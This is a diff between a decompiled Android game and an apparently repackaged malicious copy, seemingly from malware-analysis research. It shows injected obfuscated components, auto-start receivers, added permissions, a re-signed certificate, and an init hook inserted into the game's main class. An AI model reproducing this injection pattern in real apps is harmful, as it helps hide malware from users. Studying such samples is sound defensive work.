@@ -1,0 +1,303 @@
+diff -r result/APP_52/App_B_52/AndroidManifest.xml result/APP_52/App_M_52/AndroidManifest.xml
+14a15,80
+>         <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="" android:launchMode="singleTask" android:name="com.sumase.nuatie.wulley.NsoanActivity"/>
+>         <service android:name="com.sumase.nuatie.wulley.PsemkwinActivity"/>
+>         <receiver android:name="com.sumase.nuatie.wulley.RsollyActivity">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.USER_PRESENT"/>
+>             </intent-filter>
+>         </receiver>
+>         <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="" android:launchMode="singleTask" android:name="com.luotuy.mustn.CllenActivity"/>
+>         <service android:name="com.luotuy.mustn.BaseOseAveyen"/>
+>         <receiver android:name="com.luotuy.mustn.VenrowoActivity">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.USER_PRESENT"/>
+>             </intent-filter>
+>         </receiver>
+>         <activity android:configChanges="keyboardHidden|orientation" android:name="com.fuonw.suoetl.cuoll.ZusnActivity"/>
+>         <receiver android:name="com.fuonw.suoetl.cuoll.TsenaActivity">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.BOOT_COMPLETED"/>
+>             </intent-filter>
+>         </receiver>
+>         <service android:name="com.fuonw.suoetl.cuoll.CusanActivity"/>
+>         <activity android:excludeFromRecents="true" android:launchMode="singleTask" android:name="com.hunstun.tallsyen.blawe.DslenActivity"/>
+>         <service android:name="com.hunstun.tallsyen.blawe.SomeKsleActivity"/>
+>         <receiver android:name="com.hunstun.tallsyen.blawe.RsekleeActivity">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.USER_PRESENT"/>
+>             </intent-filter>
+>         </receiver>
+>         <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:launchMode="singleTask" android:name="com.hunstun.tallsyen.blawe.adermo.MsienActivity" android:screenOrientation="portrait"/>
+>         <receiver android:name="com.hunstun.tallsyen.blawe.adermo.RsamnActivity">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>         </receiver>
+32a99,106
+>     <uses-permission android:name="android.permission.INTERNET"/>
+>     <uses-permission android:name="android.permission.WAKE_LOCK"/>
+>     <uses-permission android:name="android.permission.GET_TASKS"/>
+>     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+>     <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+>     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+>     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+>     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+diff -r result/APP_52/App_B_52/apktool.yml result/APP_52/App_M_52/apktool.yml
+2c2
+< apkFileName: Bapp52-7D6764449ED1A4CD16BA02D1C889E30491BD71DB99CB92EC20CFD7E622011B55.apk
+---
+> apkFileName: Mapp52-8CD4179BD127AA92B8CE0126B25DD106B37D269320ABDA679E1A82BFA7BC16A2.apk
+7a8
+> - res/raw/version.txt
+10d10
+< - res/raw/version.dat.txt
+Somente em result/APP_52/App_M_52/: assets
+Somente em result/APP_52/App_M_52/com: fuonw
+Somente em result/APP_52/App_M_52/com: hunstun
+Somente em result/APP_52/App_M_52/com: luotuy
+Somente em result/APP_52/App_M_52/com: sumase
+diff -r result/APP_52/App_B_52/ltd/pte/wavea/mathematicianschamber/MathematiciansChamber.java result/APP_52/App_M_52/ltd/pte/wavea/mathematicianschamber/MathematiciansChamber.java
+44a45
+> import com.luotuy.mustn.CoseIsenActivity;
+4018a4020
+>     CoseIsenActivity.init(this);
+4071c4073
+<           break label1802;
+---
+>           break label1806;
+4123c4125
+<               break label2029;
+---
+>               break label2033;
+4128c4130
+<               break label2037;
+---
+>               break label2041;
+4150c4152
+<               break label2088;
+---
+>               break label2092;
+4155c4157
+<               break label2045;
+---
+>               break label2049;
+4211c4213
+<               break label2670;
+---
+>               break label2674;
+4230c4232
+<               label1802:
+---
+>               label1806:
+4276c4278
+<           label2029:
+---
+>           label2033:
+4279c4281
+<           label2037:
+---
+>           label2041:
+4282c4284
+<           label2045:
+---
+>           label2049:
+4289c4291
+<           label2088:
+---
+>           label2092:
+4319c4321
+<             label2375:
+---
+>             label2379:
+4323c4325
+<               break label2624;
+---
+>               break label2628;
+4343,4344c4345,4346
+<             break label2375;
+<             label2624:
+---
+>             break label2379;
+>             label2628:
+4351c4353
+<           label2670:
+---
+>           label2674:
+Os arquivos binários result/APP_52/App_B_52/original/AndroidManifest.xml e result/APP_52/App_M_52/original/AndroidManifest.xml são diferentes
+Os arquivos binários result/APP_52/App_B_52/original/META-INF/CERT.RSA e result/APP_52/App_M_52/original/META-INF/CERT.RSA são diferentes
+diff -r result/APP_52/App_B_52/original/META-INF/CERT.SF result/APP_52/App_M_52/original/META-INF/CERT.SF
+2,3c2,3
+< Created-By: 1.0 (Android)
+< SHA1-Digest-Manifest: C8AXfzAz4kX8RMlFpiimH60XKoA=
+---
+> Created-By: 1.0 (Android SignApk)
+> SHA1-Digest-Manifest: 5IoaukoWREwswVUvCT3RzPOwWl4=
+49a50,52
+> Name: res/raw/version.txt
+> SHA1-Digest: ytmqB+siZKWbS6yyZTobtWRjPUI=
+> 
+51c54
+< SHA1-Digest: BWG1GdVXwMQ0fYlQRgw+bjy9p+g=
+---
+> SHA1-Digest: 8nEIOn6NhfvlxILJm1/C0JoUneo=
+71,73d73
+< Name: res/drawable/s_60.jpg
+< SHA1-Digest: IFBIfloc/GoC/kbzpRatEKTPDJ0=
+< 
+79a80,82
+> Name: res/drawable/s_60.jpg
+> SHA1-Digest: IFBIfloc/GoC/kbzpRatEKTPDJ0=
+> 
+175a179,181
+> Name: assets/9.dat
+> SHA1-Digest: jNZ757NKPkYYqIpK8035xX+Xon0=
+> 
+264c270
+< SHA1-Digest: Eh/xNfLSOwxiHNVRmSpbro/J9b0=
+---
+> SHA1-Digest: 9BH31xQEuSdG51QmLyu+RiTYtPk=
+360c366
+< SHA1-Digest: zyFVz2tfZ6H9cU91P3uqof0DDsA=
+---
+> SHA1-Digest: TdCMBP8cV676Fm5diVX/UOmor4E=
+573c579
+< SHA1-Digest: s0fjEtBXhDD+fRJVG18sqbexWMc=
+---
+> SHA1-Digest: Y1ME5V4JYlVS5ZuK8BNrbBotjrI=
+699c705
+< SHA1-Digest: 1J7iPaASvprxk/t4wcfsLLLDwpM=
+---
+> SHA1-Digest: rg/BPhh85CgloMgyjgTTfVUyTvo=
+726c732
+< SHA1-Digest: izjNdvE0FLUsnvVaFtXHcEo8Qpg=
+---
+> SHA1-Digest: zfN/nTF9/ZHlV4o5xUHbFjbVqqc=
+737,739d742
+< Name: res/drawable/item_19.png
+< SHA1-Digest: MCdrFcjMociLzU7tIyw3GATgCnA=
+< 
+742a746,748
+> Name: res/drawable/item_19.png
+> SHA1-Digest: MCdrFcjMociLzU7tIyw3GATgCnA=
+> 
+749,751d754
+< Name: res/raw/version.dat.txt
+< SHA1-Digest: rmBZUAYKlX222CAI3JqtTDxdRXE=
+< 
+777c780
+< SHA1-Digest: wKOeEprVJ8wrCBXE1un0iZLo0CI=
+---
+> SHA1-Digest: 6K9cKFovaENiOaIUWtGGnrJmIwk=
+877a881,883
+> Name: assets/jawz/jso.dat
+> SHA1-Digest: 8PjkPJXWnb3nfag0bUBicX90Z64=
+> 
+1044a1051,1053
+> 
+> Name: assets/topsen/eosw.dat
+> SHA1-Digest: kyBP/Lf5oXZTriL1JC+OFs7Szoo=
+diff -r result/APP_52/App_B_52/original/META-INF/MANIFEST.MF result/APP_52/App_M_52/original/META-INF/MANIFEST.MF
+2c2
+< Created-By: 1.0 (Android)
+---
+> Created-By: 1.0 (Android SignApk)
+45a46,48
+> Name: res/raw/version.txt
+> SHA1-Digest: UocC7aKUpYxQTGABXGYFNmsUYzI=
+> 
+50c53
+< SHA1-Digest: qK8ZXqWLVk3nWtyUH1LjMxaQZ8c=
+---
+> SHA1-Digest: OzSAejc71iczjI8tCp4/p+9Pv8U=
+174a178,180
+> Name: assets/9.dat
+> SHA1-Digest: zBoPjoLLdPOE2px5zmEHPyurils=
+> 
+266c272
+< SHA1-Digest: 70OtCla2S2/iLDOvsMWdxgCbFCM=
+---
+> SHA1-Digest: oRvDJ5UYm4GlPrJiSDo1688Hw1o=
+359c365
+< SHA1-Digest: VB/kMGEmzj1q8XoljLfkvOjufdw=
+---
+> SHA1-Digest: bkwWqWCIpaHhQB87lIX9RaFJ2aE=
+572c578
+< SHA1-Digest: 3DnoSQgLVmzYGd0S8fklBJruhJQ=
+---
+> SHA1-Digest: ouofrWegXVuWKF+cz0EUonORVzI=
+695c701
+< SHA1-Digest: N9g6Ez6liFb+0ugtRTsSzPg0bIo=
+---
+> SHA1-Digest: MU2uJlOg7B8QPyA3I8cWprxL6Rs=
+725c731
+< SHA1-Digest: 4kZMQaVKVg8FrPhcUloNZsZhE64=
+---
+> SHA1-Digest: HeGmwEi6wAnfTwniZME7WakifQU=
+736,738d741
+< Name: res/drawable/n_14.jpg
+< SHA1-Digest: Seu99DqNu1xhmOa8JUYxSkXS3mU=
+< 
+741a745,747
+> Name: res/drawable/n_14.jpg
+> SHA1-Digest: Seu99DqNu1xhmOa8JUYxSkXS3mU=
+> 
+745,747d750
+< Name: res/raw/version.dat.txt
+< SHA1-Digest: UocC7aKUpYxQTGABXGYFNmsUYzI=
+< 
+773c776
+< SHA1-Digest: O0VTicgQafRxcfiZcGRDo0wDnXg=
+---
+> SHA1-Digest: OdoXRpCTbaDyMdkmHodYgU/iKh8=
+879a883,885
+> Name: assets/jawz/jso.dat
+> SHA1-Digest: D2/j/Fxc6lk8tuQXgMttSFQRsZw=
+> 
+1043a1050,1052
+> 
+> Name: assets/topsen/eosw.dat
+> SHA1-Digest: hZm7d/Jx5BPdDqPbDwtXCSeWJL4=
+Somente em result/APP_52/App_M_52/smali/com: fuonw
+Somente em result/APP_52/App_M_52/smali/com: hunstun
+Somente em result/APP_52/App_M_52/smali/com: luotuy
+Somente em result/APP_52/App_M_52/smali/com: sumase
+diff -r result/APP_52/App_B_52/smali/ltd/pte/wavea/mathematicianschamber/MathematiciansChamber.smali result/APP_52/App_M_52/smali/ltd/pte/wavea/mathematicianschamber/MathematiciansChamber.smali
+20732a20733,20734
+>     invoke-static {p0}, Lcom/luotuy/mustn/CoseIsenActivity;->init(Landroid/content/Context;)V
+> 
+22538a22541,22542
+> 
+>     nop
